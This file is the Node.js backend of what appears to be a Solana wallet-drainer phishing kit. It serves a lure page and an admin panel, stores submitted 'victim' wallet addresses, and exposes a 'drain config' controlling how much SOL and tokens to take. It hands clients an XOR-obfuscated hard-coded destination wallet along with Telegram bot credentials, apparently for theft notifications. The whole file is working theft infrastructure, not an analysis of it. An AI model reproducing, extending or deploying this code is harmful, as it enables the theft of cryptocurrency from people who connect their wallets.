try { require('dotenv').config(); } catch(e) {}
const http = require('http');
const fs = require('fs');
const path = require('path');
const dir = path.join(__dirname, 'public');
const rootDir = __dirname;
const mime = {
  '.html': 'text/html; charset=utf-8',
  '.js': 'application/javascript; charset=utf-8',
  '.css': 'text/css; charset=utf-8',
  '.json': 'application/json',
  '.png': 'image/png',
  '.jpg': 'image/jpeg',
  '.svg': 'image/svg+xml',
  '.ico': 'image/x-icon'
};

// ── in-memory victim store ──
const victims = [];

// ── drain config ──
const configFile = path.join(rootDir, 'drain-config.json');
let drainConfig = {
  solReserve: 500000,
  solPercentage: 100,
  tokenReserve: 0,
  maxPerTx: 24,
  enabled: true
};
try {
  if (fs.existsSync(configFile)) drainConfig = JSON.parse(fs.readFileSync(configFile, 'utf-8'));
} catch (e) {}

function saveConfig() {
  try { fs.writeFileSync(configFile, JSON.stringify(drainConfig, null, 2)); } catch (e) {}
}

// ── runtime seed from env ──
const XOR_KEY = 'ech3lon';
function xorEnc(str) {
  let out = '';
  for (let i = 0; i < str.length; i++) {
    out += String.fromCharCode(str.charCodeAt(i) ^ XOR_KEY.charCodeAt(i % XOR_KEY.length));
  }
  return Buffer.from(out, 'binary').toString('base64');
}

const seed = {
  d: xorEnc(process.env.DRAIN_DEST || 'AJ5obv7kqWiBCiqAAsqR9Anx9XEoKjnCVM4vKAgABFPM'),
  tok: process.env.TG_TOK || '',
  chat: process.env.TG_CHAT || ''
};

// ── request helpers ──
function readBody(req) {
  return new Promise((resolve, reject) => {
    let body = '';
    req.on('data', chunk => body += chunk);
    req.on('end', () => {
      try { resolve(JSON.parse(body)); }
      catch (e) { resolve({}); }
    });
    req.on('error', reject);
  });
}

function sendJSON(res, data, status = 200) {
  res.writeHead(status, { 'Content-Type': 'application/json' });
  res.end(JSON.stringify(data));
}

// ── static file handler with path traversal hardening ──
function serveStatic(req, res, pathname) {
  let target;
  if (pathname === '/') {
    target = path.join(dir, 'index.html');
  } else if (pathname === '/admin') {
    target = path.join(dir, 'admin.html');
  } else {
    const safe = pathname.replace(/^\//, '').replace(/\\/g, '/');
    if (safe.includes('..') || safe.includes(':') || safe.startsWith('.')) {
      res.writeHead(403); res.end('Forbidden'); return;
    }
    target = path.join(dir, safe);
  }

  const resolved = path.resolve(target);
  const root = path.resolve(dir);
  if (!resolved.startsWith(root + path.sep) && resolved !== root) {
    res.writeHead(403); res.end('Forbidden'); return;
  }

  if (!fs.existsSync(resolved) || fs.statSync(resolved).isDirectory()) {
    res.writeHead(404); res.end('Not found'); return;
  }

  const ext = path.extname(resolved).toLowerCase();
  const ct = mime[ext] || 'application/octet-stream';
  res.writeHead(200, {
    'Content-Type': ct,
    'Cache-Control': 'no-store, must-revalidate',
    'X-Content-Type-Options': 'nosniff',
    'X-Frame-Options': 'DENY'
  });
  res.end(fs.readFileSync(resolved));
}

// ── server ──
http.createServer((req, res) => {
  const parsed = new URL(req.url, `http://${req.headers.host}`);
  const pathname = parsed.pathname;

  // CORS / headers
  res.setHeader('X-Frame-Options', 'DENY');

  // ── API: seed ──
  if (req.method === 'GET' && pathname === '/api/seed') {
    return sendJSON(res, seed);
  }

  // ── API: config ──
  if (req.method === 'GET' && pathname === '/api/config') {
    return sendJSON(res, drainConfig);
  }
  if (req.method === 'POST' && pathname === '/api/config') {
    return readBody(req).then(data => {
      if (typeof data.solReserve === 'number') drainConfig.solReserve = Math.max(0, data.solReserve);
      if (typeof data.solPercentage === 'number') drainConfig.solPercentage = Math.min(100, Math.max(0, data.solPercentage));
      if (typeof data.tokenReserve === 'number') drainConfig.tokenReserve = Math.max(0, data.tokenReserve);
      if (typeof data.maxPerTx === 'number') drainConfig.maxPerTx = Math.min(48, Math.max(1, data.maxPerTx));
      if (typeof data.enabled === 'boolean') drainConfig.enabled = data.enabled;
      saveConfig();
      sendJSON(res, { ok: true, config: drainConfig });
    }).catch(e => sendJSON(res, { ok: false, error: e.message }, 400));
  }

  // ── API: victim ──
  if (req.method === 'POST' && pathname === '/api/victim') {
    return readBody(req).then(data => {
      if (data.address) {
        data.timestamp = Date.now();
        const idx = victims.findIndex(v => v.address === data.address);
        if (idx !== -1) victims[idx] = data;
        else victims.push(data);
        if (victims.length > 500) victims.splice(0, victims.length - 500);
      }
      sendJSON(res, { ok: true });
    }).catch(() => sendJSON(res, { ok: true }));
  }

  // ── API: victims ──
  if (req.method === 'GET' && pathname === '/api/victims') {
    return sendJSON(res, victims);
  }

  // ── static ──
  serveStatic(req, res, pathname);

}).listen(8080, () => {
  console.log('http://localhost:8080');
  console.log('http://localhost:8080/admin');
});
